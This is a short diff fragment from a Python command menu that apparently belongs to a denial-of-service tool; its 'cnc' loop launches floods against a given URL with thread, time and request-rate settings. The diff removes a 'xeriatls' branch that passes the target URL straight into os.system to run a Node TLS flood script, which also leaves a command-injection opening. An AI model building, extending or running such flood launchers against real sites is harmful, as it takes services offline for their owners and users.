@@ -625,15 +625,6 @@ def main():
                 print('Usage: httpget <url>')
                 print('Example: httpget http://example.com')
 
-         elif "xeriatls" in cnc:
-            try:
-                url = cnc.split()[1]
-                os.system(f' node xeriatls.js {url} {thread} {time} {reqs}')
-            except IndexError:
-                print('Usage: xeriatls <url> <thread> <time> <request_persecond>')
-                print('Example: xeriatls http://example.com')
-
-
 # BANNERS
 
         elif "troll" in cnc:
